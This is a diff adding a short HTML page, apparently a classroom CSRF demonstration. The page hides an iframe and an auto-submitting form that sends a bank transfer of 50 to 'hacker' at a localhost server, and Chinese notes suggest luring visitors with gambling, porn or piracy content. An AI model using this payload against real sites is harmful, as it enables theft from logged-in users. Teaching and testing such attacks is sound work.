@@ -1,0 +1,39 @@
+<html>
+<head>
+<meta charset='utf-8'>
+<title>恶意网站</title>
+</head>
+
+<body>
+<h1>恶意网站</h1>
+<ul>
+  <li>在网站中放置吸引人的内容，例如赌博、色情、盗版小说等，吸引人来访问
+  <li>如果用户已经登录了某银行网站，访问恶意网站首页时，自动向银行网站发起转账请求
+</ul>
+
+<style>
+iframe {
+    display: none;
+}
+
+form {
+    display: none;   
+}
+</style>
+
+
+<iframe name="iframe"></iframe>
+
+<form action="http://localhost:8888/transfer" method="POST" target='iframe'>
+  <input type="text" name="name" value="hacker" placeholder="接收用户"/>
+  <input type="text" name="amount" value="50" placeholder="转账数量"/>
+  <input type="submit" id="submit" value="转账">
+</form>
+
+<script>
+var submit = document.getElementById('submit');
+submit.click();
+</script>
+
+</body>
+</html>
